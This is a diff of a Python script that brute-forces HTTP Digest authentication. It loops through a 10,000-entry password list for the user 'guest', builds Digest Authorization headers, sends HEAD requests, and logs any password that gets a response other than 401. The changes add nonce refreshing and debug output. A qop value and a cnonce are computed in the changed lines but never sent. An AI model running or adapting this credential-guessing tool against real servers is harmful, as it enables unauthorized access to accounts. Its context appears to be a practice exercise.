@@ -37,7 +37,7 @@ def parse_authheaders(authheader) -> str:
     return nonce
 
 
-def main():
+def main() -> None:
     # manual progress tracking, I know
     total = 0
 
@@ -48,8 +48,8 @@ def main():
     user = 'guest'
     uri = '/HTTP/Digest/'
     method = 'HEAD'
-    # qop = 'auth'
-    filename: str = '10k.txt'
+    qop = 'auth'
+    filename = '10k.txt'
 
     with open(filename) as file:
         passwords = [line.rstrip() for line in file]
@@ -60,31 +60,35 @@ def main():
         exit()
 
     # get a new nonce to start the chain
-    # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to ugly slicing
-    r = requests.head(url)
-    realm_dict = dict(reg.findall(r.headers['www-authenticate']))
+    # get realm from header, has problems with '@' for some reason, have to look into that
+    request = requests.head(url)
+    realm_dict = dict(reg.findall(request.headers['www-authenticate']))
     realm = realm_dict['realm']
-    nonce = parse_authheaders(r.headers['www-authenticate'])
+    print('realm is', realm)
+    nonce = parse_authheaders(request.headers['www-authenticate'])
 
     for i in range(total, len(passwords)):
-        # cnonce = secrets.token_hex(8)
+        cnonce = secrets.token_hex(8)
         response = hashes(user, realm, passwords[i], method, uri, nonce)
         header = {
-            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{response}"'
+            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}"'
         }
         request = requests.head(url, headers=header)
-
         # triggers on status codes other than 200 but i'd want to know about those, too
         if request.status_code != 401:
             log(request, passwords[i], i)
+            # new nonces are only given on 401's, so we have to make another request for one
+            request = requests.head(url)
 
         nonce = parse_authheaders(request.headers['www-authenticate'])
 
-        if i % 100 == 0:
-            print(i, end=', ')
-        # print(i, passwords[i], request.status_code)
+        # if i % 100 == 0:
+        #     print(i, end=', ')
+        print(request.request.headers)
+        print(i, passwords[i], request.status_code)
+        # print(nonce)
 
-    print('Ç\'est la fin')
+    print('La fin.')
 
 
 if __name__ == '__main__':
